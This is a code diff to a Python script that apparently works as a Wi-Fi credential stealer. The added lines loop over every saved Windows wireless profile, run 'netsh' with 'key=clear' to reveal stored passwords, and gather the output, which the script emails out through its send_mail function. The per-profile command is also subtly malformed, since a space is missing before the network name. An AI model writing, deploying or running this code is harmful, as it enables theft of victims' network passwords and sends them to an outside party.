@@ -31,8 +31,17 @@ def send_mail(email, password, message):
 
 options = get_arguments()
 
-command = 'netsh wlan show profile'                                 # shows wifi profile
-networks = subprocess.check_output(command, shell=True)
-network_names = re.findall('(?:Profile\s*:\s)(.*)', networks)       # regex to search for network SSIDs
+command = 'netsh wlan show profile'                                     # shows wifi profile
+networks = subprocess.check_output(command, shell=True)                 # executes command
+network_names_list = re.findall('(?:Profile\s*:\s)(.*)', networks)      # regex to search for network SSIDs
+
+result = ''
+
+for network_name in network_names_list:
+    """Extracts information for each network in list"""
+    command = 'netsh wlan show profile' + network_name + ' key=clear'   # sets command
+    current_result = subprocess.check_output(command, shell=True)       # executes command
+    result += current_result
+
 
 send_mail(options.email, options.password, result)
